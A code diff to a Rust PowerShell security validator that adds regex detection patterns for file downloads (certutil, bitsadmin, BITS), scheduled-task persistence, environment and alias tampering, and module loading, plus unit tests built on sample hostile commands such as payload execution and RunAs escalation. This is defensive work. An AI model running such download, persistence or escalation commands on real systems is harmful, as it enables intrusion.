@@ -175,11 +175,11 @@ static POWERSHELL_DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(
             "PowerShell Add-Type can compile and load arbitrary code",
         ),
         (
-            r"(?i)\bNew-Object\b[^|;&\n]*-(?:ComObject|com)\b",
+            r"(?i)\bNew-Object\b[^|;&\n]*[-/\x{2013}\x{2014}\x{2015}](?:ComObject|com)\b",
             "PowerShell COM object creation can automate unsafe system components",
         ),
         (
-            r"(?i)(?:^|[|;&\n({])\s*(?:Start-Process|saps|start)\b[^|;&\n]*-(?:Verb|v)\s+RunAs\b",
+            r"(?i)(?:^|[|;&\n({])\s*(?:Start-Process|saps|start)\b[^|;&\n]*[-/\x{2013}\x{2014}\x{2015}](?:Verb|v)\s+RunAs\b",
             "PowerShell Start-Process RunAs can escalate privileges",
         ),
         (
@@ -189,6 +189,55 @@ static POWERSHELL_DANGER_PATTERNS: LazyLock<Vec<DangerPattern>> = LazyLock::new(
         (
             r"(?i)(?:^|[|;&\n({])\s*(?:Invoke-WmiMethod|Invoke-CimMethod)\b[^|;&\n]*(?:Win32_Process|Create)\b",
             "PowerShell WMI/CIM process creation can spawn unvalidated commands",
+        ),
+        // --- PowerShell security validator parity follow-up batch ---
+        (
+            r"(?i)(?:^|[|;&\n({])\s*Start-BitsTransfer\b",
+            "PowerShell Start-BitsTransfer can download files",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*certutil(?:\.exe)?\b[^|;&\n]*(?:-|/)urlcache\b",
+            "PowerShell certutil urlcache can download files",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*bitsadmin(?:\.exe)?\b[^|;&\n]*(?:-|/)transfer\b",
+            "PowerShell bitsadmin transfer can download files",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Invoke-Command|icm|Start-Job|Start-ThreadJob|Register-ScheduledJob)\b[^|;&\n]*(?:[-/\x{2013}\x{2014}\x{2015}](?:FilePath|f|LiteralPath|l)\b)",
+            "PowerShell script file execution cannot be statically validated",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:ForEach-Object|foreach|%)\b[^|;&\n]*(?:[-/\x{2013}\x{2014}\x{2015}](?:MemberName|m)\b)",
+            "PowerShell ForEach-Object -MemberName invokes methods by name",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Invoke-Item|ii)\b",
+            "PowerShell Invoke-Item opens files with the default executable handler",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Register-ScheduledTask|New-ScheduledTask|New-ScheduledTaskAction|Set-ScheduledTask)\b",
+            "PowerShell scheduled-task cmdlets create or modify persistence",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*schtasks(?:\.exe)?\b[^|;&\n]*(?:/|-)(?:create|change)\b",
+            "PowerShell schtasks create/change modifies scheduled tasks",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:Set-Item|si|New-Item|ni|Remove-Item|ri|del|rm|rd|rmdir|erase|Clear-Item|cli|Set-Content|Add-Content|ac)\b[^|;&\n]*(?:env:|\$env:)",
+            "PowerShell command modifies environment variables",
+        ),
+        (
+            r"(?i)\$env:[A-Za-z_][A-Za-z0-9_]*\s*[+\-*/]?=",
+            "PowerShell assignment modifies environment variables",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:(?:[A-Za-z0-9_.-]+\\)?(?:Import-Module|ipmo|Install-Module|Save-Module|Update-Module|Install-Script|Save-Script))\b",
+            "PowerShell module or script loading can execute code",
+        ),
+        (
+            r"(?i)(?:^|[|;&\n({])\s*(?:(?:[A-Za-z0-9_.-]+\\)?(?:Set-Alias|sal|New-Alias|nal|Set-Variable|sv|New-Variable|nv))\b",
+            "PowerShell alias or variable mutation can affect future command resolution",
         ),
     ];
 
@@ -426,7 +475,39 @@ mod tests {
             "Invoke-WmiMethod -Class Win32_Process -Name Create"
         )
         .is_some());
+        assert!(
+            is_dangerous_powershell_command("Start-BitsTransfer https://example.test/a.exe")
+                .is_some()
+        );
+        assert!(is_dangerous_powershell_command("certutil.exe -urlcache -f https://x y").is_some());
+        assert!(is_dangerous_powershell_command("bitsadmin /transfer job https://x y").is_some());
+        assert!(
+            is_dangerous_powershell_command("Invoke-Command -FilePath .\\payload.ps1").is_some()
+        );
+        assert!(
+            is_dangerous_powershell_command("Get-Process | ForEach-Object -MemberName Kill")
+                .is_some()
+        );
+        assert!(is_dangerous_powershell_command("Invoke-Item .\\payload.ps1").is_some());
+        assert!(is_dangerous_powershell_command(
+            "Register-ScheduledTask -TaskName p -Action $action"
+        )
+        .is_some());
+        assert!(is_dangerous_powershell_command("schtasks /create /tn p /tr calc.exe").is_some());
+        assert!(is_dangerous_powershell_command("Set-Item env:PATH C:\\tmp").is_some());
+        assert!(is_dangerous_powershell_command("$env:PATH = 'C:\\tmp'").is_some());
+        assert!(is_dangerous_powershell_command("Import-Module .\\payload.psm1").is_some());
+        assert!(
+            is_dangerous_powershell_command("Set-Alias Get-Content Invoke-Expression").is_some()
+        );
+        assert!(is_dangerous_powershell_command(
+            "Microsoft.PowerShell.Utility\\Set-Variable PSDefaultParameterValues @{}"
+        )
+        .is_some());
+        assert!(is_dangerous_powershell_command("Start-Process calc.exe /Verb RunAs").is_some());
+        assert!(is_dangerous_powershell_command(r"New-Object /ComObject WScript.Shell").is_some());
         assert!(is_dangerous_powershell_command("Get-Process powershell").is_none());
+        assert!(is_dangerous_powershell_command("Get-ChildItem env:").is_none());
         assert!(is_dangerous_command("powershell.exe -EncodedCommand SQBFAFgA").is_none());
     }
 }
